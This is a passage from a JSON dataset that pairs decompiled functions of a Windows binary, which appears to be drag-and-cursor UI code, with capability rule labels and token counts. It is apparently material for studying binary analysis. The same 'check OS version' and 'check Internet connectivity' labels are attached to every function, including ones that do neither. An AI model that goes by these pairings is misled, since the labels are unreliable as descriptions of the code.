            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004422e4(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + -1;\n    if (*(in_EAX + 0x6c) < 1) {\n        *(in_EAX + 0x6c) = 0;\n        fcn.00443b64();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "004366d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004366d4(void)\n\n{\n    int32_t iVar1;\n    \n    sub.user32.dll_GetCapture();\n    iVar1 = fcn.004363b8();\n    if (((iVar1 != 0) && (*0x461b4c != 0)) && (iVar1 == *(*0x461b4c + 0x30))) {\n        iVar1 = *0x461b4c;\n    }\n    return iVar1;\n}\n",
        "token_count": 102
    },
    "004366fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004366fc(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    sub.user32.dll_ReleaseCapture();\n    *0x461b4c = 0;\n    if ((in_EAX != 0) &&\n       ((cVar2 = fcn.004033e4(),  iVar1 = *0x461b4c,  cVar2 != '\\0' || (iVar1 = in_EAX,  *(in_EAX + 0x30) != 0)))) {\n        *0x461b4c = iVar1;\n        uVar3 = fcn.0043fd08();\n        sub.user32.dll_SetCapture(uVar3);\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00436ba4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436ba4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    if (arg_8h == '\\0') {\n        fcn.00403454();\n    }\n    (**(*in_EAX + 0x24))(arg_ch);\n    return;\n}\n",
        "token_count": 73
    },
    "00436c40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00436c40(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00436b28();\n    uVar1 = fcn.0041cf14();\n    *(in_EAX + 0x40) = uVar1;\n    fcn.00423b70();\n    fcn.0041d090();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 211
    },
    "00436e34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00436e34(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    if (arg_8h == arg_ch[1]) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_ch[2] == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n            iVar2 = sub.user32.dll_PtInRect(&var_10h, arg_ch[3], arg_ch[4]);\n            if (iVar2 != 0) {\n                arg_ch[2] = arg_8h;\n            }\n        }\n        if (arg_8h == arg_ch[2]) {\n            uVar1 = 0;\n            *(arg_ch + 5) = 1;\n        }\n        else if (arg_8h == *arg_ch) {\n            uVar1 = 0xffffffff;\n            arg_ch[2] = 0;\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 255
    },
    "00436ea0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00436ea0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint lprcSrc2;\n    uint lprcSrc1;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t hWnd;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    hWnd = fcn.004372f0();\n    uVar2 = func_0x0040667c(hWnd, 4);\n    if (uVar2 != *(**0x462098 + 0x30)) {\n        uVar2 = fcn.004363b8();\n        if (uVar2 == 0) goto code_r0x0043702e;\n        do {\n            uVar2 = *(uVar2 + 0x30);\n        } while (uVar2 != 0);\n        uVar2 = fcn.0043fd08();\n        hWnd = uVar2;\n    }\n    if (hWnd != 0) {\n        do {\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n        uVar2 = fcn.0043fd08();\n        if (uVar2 != hWnd) {\n            iVar4 = *(*(arg_8h + -0x10) + 0x30);\n            var_18h = uVar2;\n            if (iVar4 == 0) {\n                cVar1 = fcn.004033e4();\n                if (cVar1 == '\\0') {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = fcn.0043fd08();\n                }\n            }\n            else {\n                do {\n                    iVar4 = *(iVar4 + 0x30);\n                } while (iVar4 != 0);\n                var_1ch = fcn.0043fd08();\n            }\n            var_8h._0_1_ = '\\0';\n            var_10h = *(arg_8h + -9);\n            var_ch = *(arg_8h + -5);\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.00436e34, &var_1ch);\n            uVar2 = sub.user32.dll_EnumThreadWindows(uVar3);\n            if (var_8h != '\\0') {\n                sub.user32.dll_GetWindowRect(hWnd, &lprcSrc1);\n                fcn.00403454(arg_8h + -1, arg_8h + -9);\n                cVar1 = fcn.004033e4();\n                if ((((cVar1 == '\\0') || (*(*(*0x463b30 + 0x38) + 0xa0) == 0)) ||\n                    (uVar2 = fcn.0043fd08(),  uVar2 != hWnd)) &&\n                   (uVar2 = sub.user32.dll_IntersectRect(&lprcSrc1, &lprcSrc1, &lprcSrc2),  uVar2 != 0)) {\n                    var_1h._0_1_ = 0;\n                }\n            }\n        }\n    }\ncode_r0x0043702e:\n    return uVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 801
    },
    "0043707c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0043707c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lprc;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint pt;\n    uint var_5h;\n    uint var_1h;\n    \n    pt = *in_EAX;\n    var_5h = in_EAX[1];\n    var_18h = 0;\n    if (*0x463b54 != 0) {\n        puVar5 = 0x11;\n        var_10h = param_2;\n        uVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (((uVar2 & 0x8000) != 0) != *(**0x462098 + 0xb4)) {\n            (**(**0x463b58 + 8))();\n            iVar4 = *(*0x463b54 + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_14h = fcn.00413b64();\n                    if (((var_14h != var_10h) && (*(var_14h + 0x1a6) != '\\0')) &&\n                       (cVar1 = (**(*var_14h + 0x50))(),  cVar1 != '\\0')) {\n                        puVar5 = fcn.0043fd08();\n                        iVar3 = sub.user32.dll_IsWindowVisible();\n                        if (((iVar3 != 0) && (cVar1 = fcn.00437038(&var_1h + 1),  cVar1 == '\\0')) &&\n                           ((var_10h[0x28] != var_14h || (iVar3 = fcn.0043e838(),  1 < iVar3)))) {\n                            var_1h._0_1_ = '\\x01';\n                            puVar5 = &var_1h;\n                            fcn.00403454();\n                            if (var_1h != '\\0') {\n                                puVar5 = &lprc;\n                                iVar3 = sub.user32.dll_PtInRect();\n                                if (iVar3 != 0) {\n                                    fcn.00436804();\n                                }\n                            }\n                        }\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (0 < (*0x463b58)[2]) {\n                var_18h = fcn.00436894(puVar5);\n            }\n            if ((var_18h != 0) && (cVar1 = fcn.00436ea0(&var_1h + 1),  cVar1 == '\\0')) {\n                var_18h = 0;\n            }\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 692
    },
    "004371d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004371d8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        if (*0x463b54 == 0) {\n            *0x463b54 = fcn.00403228();\n        }\n        iVar1 = fcn.00413bc0();\n        if (param_2 == '\\0') {\n            if (iVar1 != -1) {\n                fcn.00413a54();\n            }\n        }\n        else if (iVar1 == -1) {\n            fcn.00413a08();\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004373a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004373a8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = *(*0x463b30 + 4);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x1a7) != '\\0')) && (*(iVar1 + 0x178) != 0)) &&\n       (iVar2 = fcn.0043e7a4(),  iVar2 != 0)) {\n        iVar2 = fcn.0043e7a4();\n        if ((iVar2 == 1) && (iVar2 = fcn.00413b64(),  iVar2 == *(*0x463b30 + 0x38))) {\n            return 0;\n        }\n        iVar2 = fcn.00437dd8();\n        while( true ) {\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (iVar1 == iVar2) {\n                return 0;\n            }\n            iVar3 = fcn.00413bc0();\n            if (iVar3 != -1) break;\n            iVar2 = *(iVar2 + 0x30);\n        }\n        uVar4 = fcn.0043e7b8();\n    }\n    return uVar4;\n}\n",
        "token_count": 299
    },
    "0043743c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043743c(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    if (((*0x463b4c == '\\0') &&\n        (uVar9 = *0x463b3c - *in_EAX >> 0x1f,  (*0x463b3c - *in_EAX ^ uVar9) - uVar9 < *0x463b48)) &&\n       (uVar9 = *0x463b40 - in_EAX[1] >> 0x1f,  (*0x463b40 - in_EAX[1] ^ uVar9) - uVar9 < *0x463b48)) {\n        return;\n    }\n    iVar10 = 0x437496;\n    iVar7 = fcn.0043731c(*0x463b2c);\n    if ((*0x463b4c == '\\0') && (*0x463b50 != 0)) {\n        iVar10 = *0x463b40;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.00441778(iVar10);\n    }\n    if (*(*0x463b2c + 0x9b) == '\\0') {\n        *0x463b4c = '\\x01';\n    }\n    else {\n        *0x463b4c = '\\x02';\n    }\n    if (iVar7 != (*0x463b30)[1]) {\n        fcn.0043736c();\n        if (*0x463b30 == NULL) {\n            return;\n        }\n        (*0x463b30)[1] = iVar7;\n        (*0x463b30)[2] = iVar10;\n        piVar1 = *0x463b30;\n        (*0x463b30)[3] = *in_EAX;\n        piVar1[4] = in_EAX[1];\n        fcn.0043736c();\n        if (*0x463b30 == NULL) {\n            return;\n        }\n    }\n    piVar1 = *0x463b30;\n    (*0x463b30)[3] = *in_EAX;\n    piVar1[4] = in_EAX[1];\n    if ((*0x463b30)[1] != 0) {\n        fcn.00439070();\n        piVar1 = *0x463b30;\n        (*0x463b30)[5] = iStack28;\n        piVar1[6] = iStack24;\n    }\n    fcn.0043736c(in_EAX[1]);\n    (**(**0x463b30 + 4))();\n    if (*0x463b50 != 0) {\n        if ((iVar7 == 0) || ((*(iVar7 + 0x51) & 0x20) != 0)) {\n            fcn.00441734();\n            if (*(*0x463b50 + 0x6a) == '\\0') {\n                iVar10 = in_EAX[1];\n                sub.user32.dll_GetDesktopWindow();\n                fcn.00441778(iVar10);\n            }\n            else {\n                fcn.00441860();\n            }\n        }\n        else {\n            fcn.004418d4();\n            uVar8 = fcn.004573cc();\n            sub.user32.dll_SetCursor(uVar8);\n        }\n    }\n    cVar4 = fcn.004573cc();\n    sub.user32.dll_SetCursor();\n    if (*0x463b4c == '\\x02') {\n        if (iVar7 == 0) {\n            fcn.00403454(in_EAX[1]);\n        }\n        else {\n            iVar10 = fcn.004373a8();\n            (*0x463b30)[0x16] = iVar10;\n            if (iVar10 == 0) {\n                uVar5 = fcn.00403454();\n                *(*0x463b30 + 0x15) = uVar5;\n            }\n            else {\n                fcn.00439070();\n                uVar5 = fcn.00403454();\n                *(*0x463b30 + 0x15) = uVar5;\n            }\n        }\n        if ((*0x463b30 != NULL) && (cVar6 = fcn.00407bdc(),  cVar6 == '\\0')) {\n            if (cVar4 != '\\0') {\n                (**(**0x463b30 + 0x34))();\n            }\n            (**(**0x463b30 + 0x30))();\n            piVar3 = *0x463b30;\n            piVar2 = *0x463b30 + 0x18;\n            piVar1 = *0x463b30 + 0x12;\n            (*0x463b30)[0x17] = (*0x463b30)[0x11];\n            *piVar2 = *piVar1;\n            piVar3[0x19] = piVar3[0x13];\n            piVar3[0x1a] = piVar3[0x14];\n        }\n    }\n    return;\n}\n",
        "token_count": 1201
    },
    "0043770c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043770c(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    *0x463b30 = in_EAX;\n    in_EAX[1] = 0;\n    sub.user32.dll_GetCursorPos(0x463b3c);\n    piVar1 = *0x463b30;\n    (*0x463b30)[3] = *0x463b3c;\n    piVar1[4] = *0x463b40;\n    *0x463b44 = sub.user32.dll_GetCursor();\n    *0x463b38 = fcn.00436938();\n    *0x463b48 = param_1;\n    cVar2 = fcn.004033e4();\n    if (cVar2 == '\\0') {\n        if (param_2 == '\\0') {\n            *0x463b4c = '\\0';\n        }\n        else {\n            *0x463b4c = '\\x01';\n        }\n    }\n    else {\n        iVar3 = in_EAX[0x11];\n        if (in_EAX[0x13] == iVar3 || in_EAX[0x13] - iVar3 < 0) {\n            in_EAX[8] = 0;\n            in_EAX[9] = 0;\n        }\n        else {\n            *(in_EAX + 8) = (in_EAX[3] - iVar3) / (in_EAX[0x13] - in_EAX[0x11]);\n        }\n        iVar3 = in_EAX[0x12];\n        if (in_EAX[0x14] == iVar3 || in_EAX[0x14] - iVar3 < 0) {\n            in_EAX[10] = 0;\n            in_EAX[0xb] = 0;\n        }\n        else {\n            *(in_EAX + 10) = (in_EAX[4] - iVar3) / (in_EAX[0x14] - in_EAX[0x12]);\n        }\n        if (param_2 == '\\0') {\n            *0x463b4c = '\\0';\n        }\n        else {\n            *0x463b4c = '\\x02';\n            (**(*in_EAX + 0x30))();\n        }\n    }\n    *0x463b50 = (**(**0x463b30 + 8))();\n    if (*0x463b50 != 0) {\n        iVar3 = *0x463b40;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.00441778(iVar3);\n    }\n    *0x463b58 = fcn.00403228();\n    if (*0x463b4c != '\\0') {\n        fcn.0043743c();\n    }\n    return;\n}\n",
        "token_count": 646
    },
    "0043787c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043787c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x437a21;\n    iStack60 = *in_FS_OFFSET;\n    *0x463b2c = in_EAX;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = 0;\n    *0x463b34 = 0;\n    if (*(in_EAX + 0x9b) == '\\0') {\n        puStack64 = 0x4378c3;\n        puStack52 = &stack0xfffffffc;\n        fcn.00403454();\n        if (*0x463b2c == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            puStack64 = 0x4378f1;\n            var_8h = fcn.00436b28();\n            *0x463b34 = 1;\n        }\n    }\n    else {\n        fcn.00403454();\n        if (*0x463b2c == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            var_8h = fcn.00436c40();\n            *0x463b34 = 1;\n        }\n        cVar1 = fcn.004033e4();\n        if (cVar1 == '\\0') {\n            if ((*(*(var_8h + 0x38) + 0x30) == 0) && (cVar1 = fcn.004033e4(),  cVar1 == '\\0')) {\n                puStack64 = &fcn.0043787c::lpPoint;\n                sub.user32.dll_GetCursorPos();\n                *(var_8h + 0x44) = lpPoint;\n                *(var_8h + 0x48) = var_ch;\n            }\n            else {\n                fcn.00412708();\n                puStack64 = 0x4379c2;\n                fcn.00439044();\n                *(var_8h + 0x44) = var_18h;\n                *(var_8h + 0x48) = var_14h;\n            }\n            fcn.00412708();\n            *(var_8h + 0x4c) = var_18h;\n            *(var_8h + 0x50) = var_14h;\n        }\n        else {\n            puStack64 = var_8h + 0x44;\n            uVar2 = fcn.0043fd08();\n            sub.user32.dll_GetWindowRect(uVar2);\n        }\n        *(var_8h + 0x5c) = *(var_8h + 0x44);\n        *(var_8h + 0x60) = *(var_8h + 0x48);\n        *(var_8h + 100) = *(var_8h + 0x4c);\n        *(var_8h + 0x68) = *(var_8h + 0x50);\n    }\n    fcn.0043770c();\n    *in_FS_OFFSET = puStack64;\n    return;\n}\n",
        "token_count": 821
    },
    "00437a40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00437a40(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *(*0x463b30 + 4) != 0;\n    if ((*(arg_8h + -1) != '\\0') && (*0x463b4c == '\\x02')) {\n        cVar1 = (**(**0x463b2c + 0x54))();\n        if ((cVar1 == '\\0') && ((*0x463b2c)[0x28] != 0)) {\n            if ((*0x463b2c)[0x28] != 0) {\n                uVar2 = fcn.00403454();\n            }\n        }\n        else {\n            uVar2 = CONCAT31((unaff_EBX & 0xffffff00) >> 8, 1);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 227
    },
    "00437ab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00437ab4(void)\n\n{\n    char in_AL;\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ah;\n    uint32_t var_6h;\n    uint var_1h;\n    \n    puStack24 = &fcn.00437ab4::var_1h + 1;\n    puStack36 = &fcn.00437ab4::var_1h + 1;\n    piVar4 = NULL;\n    if ((*0x463b30 == NULL) || (*(*0x463b30 + 0xc) != '\\0')) {\n        return;\n    }\n    uStack28 = 0x437d80;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *0x463b5c = *0x463b30;\n    uStack40 = 0x437d0e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    *(*0x463b30 + 0xc) = 1;\n    *(*0x463b30 + 7) = in_AL;\n    var_1h._0_1_ = in_AL;\n    fcn.00436980();\n    if (*0x463b4c == '\\x02') {\n        piVar4 = fcn.00403408();\n        (**(*piVar4 + 0x34))();\n        *(piVar4 + 0x1b) = piVar4[1] == 0;\n    }\n    if ((*0x463b30)[1] == 0) {\ncode_r0x00437b8b:\n        var_6h = (*0x463b30)[4];\n    }\n    else {\n        cVar1 = fcn.004033e4();\n        if (cVar1 == '\\0') goto code_r0x00437b8b;\n        var_6h = (*0x463b30)[6];\n    }\n    cVar1 = fcn.00437a40(&fcn.00437ab4::var_1h + 1);\n    if (cVar1 != '\\0') {\n        if ((*0x463b4c == '\\x02') && (*(piVar4 + 0x1b) != '\\0')) {\ncode_r0x00437bca:\n            if (var_1h != '\\0') {\n                uVar2 = 1;\n                goto code_r0x00437bd6;\n            }\n        }\n        else if (*0x463b4c != '\\0') {\n            cVar1 = fcn.0043736c();\n            if (cVar1 != '\\0') goto code_r0x00437bca;\n        }\n    }\n    uVar2 = 0;\ncode_r0x00437bd6:\n    if (*0x463b4c == '\\x02') {\n        if ((uVar2 != 0) && (*(piVar4 + 0x1b) != '\\0')) {\n            iVar3 = fcn.004506c0();\n            if ((iVar3 != 0) && (*(iVar3 + 0x220) == piVar4[0xe])) {\n                fcn.0045432c();\n            }\n            fcn.0043a6d4(*0x463b30);\n        }\n    }\n    else if (*0x463b50 == 0) {\n        sub.user32.dll_SetCursor(*0x463b44);\n    }\n    else {\n        fcn.004418d4();\n    }\n    *0x463b2c = 0;\n    *0x463b30 = NULL;\n    if ((*0x463b5c != NULL) && ((*0x463b5c)[1] != 0)) {\n        if (uVar2 == 0) {\n            (*0x463b5c)[3] = 0;\n            (*0x463b5c)[4] = 0;\n            var_6h = 0;\n        }\n        fcn.00437238(*0x463b5c + 3, (*0x463b5c)[1]);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x437d15;\n    uStack40 = 0x437cd1;\n    fcn.00403258();\n    *0x463b58 = 0;\n    if (*0x463b5c != NULL) {\n        *(*0x463b5c + 0xc) = 0;\n        uStack40 = var_6h;\n        uStack44 = var_6h & 0xffffff00 | uVar2;\n        (****0x463b5c)();\n    }\n    *0x463b30 = NULL;\n    return;\n}\n",
        "token_count": 1141
    },
    "00437d8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00437d8c(void)\n\n{\n    if (*0x463b30 != 0) {\n        fcn.00437ab4();\n    }\n    *0x463b2c = 0;\n    return;\n}\n",
        "token_count": 53
    },
    "00437e20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00437e20(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX == 0) {\n        iVar1 = fcn.00403228();\n        *in_EAX = iVar1;\n    }\n    fcn.00413a08();\n    return;\n}\n",
        "token_count": 75
    },
    "00437e48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00437e48(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00413ca8();\n    if (*(*in_EAX + 8) == 0) {\n        fcn.00403258();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00437f54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00437f54(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x437f64;\n    var_8h = fcn.00413ed0();\n    uStack24 = 0x437ff2;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x437f8f;\n            var_ch = fcn.00413b64();\n            puStack32 = 0x437f9a;\n            cVar1 = fcn.0041d6a0();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x437fca;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.004380d4();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x437fd1;\n                uStack36 = 0x437fc9;\n                fcn.0041d6fc();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x437ff9;\n    uStack24 = 0x437ff1;\n    fcn.00413f34();\n    return;\n}\n",
        "token_count": 456
    },
    "0043802c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
